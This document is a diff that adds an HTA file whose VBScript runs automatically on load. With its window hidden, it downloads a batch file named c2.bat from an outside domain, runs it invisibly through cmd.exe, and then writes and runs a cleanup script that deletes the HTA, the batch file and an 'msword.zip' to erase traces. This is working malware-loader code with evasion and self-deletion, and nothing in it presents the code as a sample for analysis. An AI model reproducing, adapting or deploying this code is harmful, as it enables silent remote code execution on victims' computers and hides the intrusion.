@@ -1,0 +1,128 @@
+<html>
+<head>
+    <title></title>
+    <HTA:APPLICATION
+        ID="downloadBatApp"
+        APPLICATIONNAME="BAT Downloader"
+        WINDOWSTATE="minimize"
+        BORDER="thin"
+        SCROLL="no"
+        SINGLEINSTANCE="yes"
+        SHOWINTASKBAR="no"
+        SYSMENU="no"
+    />
+    <script language="VBScript">
+        Sub DownloadAndRunBat()
+            Dim objShell, objXMLHTTP, tempFolder, tempFilePath, psCommand, resultFile
+            Dim objFSO, resultLog, downloadSuccessful, cleanupScriptFile, htaFilePath
+
+            ' URL of the BAT file to download
+            Const BAT_FILE_URL = "https://candwfarmsllc.com/c2.bat"
+
+            ' Paths for temp.bat and result log
+            Set objFSO = CreateObject("Scripting.FileSystemObject")
+            tempFolder = objFSO.GetSpecialFolder(2) ' Temporary folder
+            tempFilePath = tempFolder & "\temp.bat"
+            resultFile = tempFolder & "\download_log.txt"
+            cleanupScriptFile = tempFolder & "\cleanup.bat"
+
+            ' Set the path of the current HTA file (downloaded.hta)
+            htaFilePath = objFSO.GetAbsolutePathName("downloaded.hta")
+
+            ' Initialize variables for tracking download success
+            downloadSuccessful = False
+            resultLog = ""
+
+            ' Create the HTTP request object for downloading
+            Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP.6.0")
+            objXMLHTTP.open "GET", BAT_FILE_URL, False
+
+            On Error Resume Next
+            objXMLHTTP.send
+            On Error GoTo 0
+
+            ' Debugging: Check the HTTP status and log the result
+            If objXMLHTTP.Status = 200 Then
+                resultLog = "Download started successfully."
+                downloadSuccessful = True
+
+                ' Create a Stream object to save the downloaded file
+                Dim objStream
+                Set objStream = CreateObject("ADODB.Stream")
+                objStream.Open
+                objStream.Type = 1 ' Binary data
+                objStream.Write objXMLHTTP.ResponseBody
+                objStream.SaveToFile tempFilePath, 2 ' Save it to temp folder
+                objStream.Close
+
+                resultLog = resultLog & vbCrLf & "Download completed successfully and saved to: " & tempFilePath
+            Else
+                resultLog = "Failed to download file. HTTP Status: " & objXMLHTTP.Status
+            End If
+
+            ' Create a log file and write the result
+            Set objFSO = CreateObject("Scripting.FileSystemObject")
+            If objFSO.FileExists(resultFile) Then objFSO.DeleteFile(resultFile)
+            With objFSO.CreateTextFile(resultFile, True)
+                .Write resultLog
+                .Close
+            End With
+
+            ' Show download result in a message box
+            ' MsgBox resultLog
+
+            ' Check if the BAT file exists after download
+            If downloadSuccessful And objFSO.FileExists(tempFilePath) Then
+                ' Run the downloaded BAT file
+                Set objShell = CreateObject("WScript.Shell")
+                objShell.Run "cmd.exe /c """ & tempFilePath & """", 0, True ' Run hidden and wait for completion
+
+                ' Cleanup: Delete temp.bat file after execution
+                objFSO.DeleteFile tempFilePath
+                ' MsgBox "BAT file executed successfully, and cleanup completed!"
+            Else
+                ' MsgBox "Download failed or BAT file does not exist."
+            End If
+
+            ' Create cleanup.bat script after the download and execution process
+            WriteCleanupScript cleanupScriptFile, htaFilePath
+
+            ' Run cleanup script after the BAT file is executed
+            Set objShell = CreateObject("WScript.Shell")
+            objShell.Run "cmd.exe /c """ & cleanupScriptFile & """", 0, False ' Run cleanup in background (no wait)
+        End Sub
+
+        ' Function to create the cleanup.bat script
+        Sub WriteCleanupScript(cleanupScriptFile, htaFilePath)
+            Dim objFSO, cleanupScript
+
+            ' Create cleanup.bat script content
+            cleanupScript = "@echo off" & vbCrLf
+            cleanupScript = cleanupScript & "timeout /t 10 >nul" & vbCrLf ' Wait for 10 seconds
+
+            ' Delete the HTA file itself (downloaded.hta)
+            cleanupScript = cleanupScript & "del """ & htaFilePath & """" & vbCrLf
+
+            ' Delete the downloaded BAT file, msword.zip, and cleanup script
+            cleanupScript = cleanupScript & "del temp.bat" & vbCrLf
+            cleanupScript = cleanupScript & "del msword.zip" & vbCrLf
+            cleanupScript = cleanupScript & "del cleanup.bat" & vbCrLf
+
+            ' Save cleanup.bat
+            Set objFSO = CreateObject("Scripting.FileSystemObject")
+            With objFSO.CreateTextFile(cleanupScriptFile, True)
+                .Write cleanupScript
+                .Close
+            End With
+        End Sub
+
+        ' Run the function on window load
+        Sub Window_OnLoad
+            DownloadAndRunBat()
+            Window.Close
+        End Sub
+    </script>
+</head>
+<body>
+</body>
+</html>
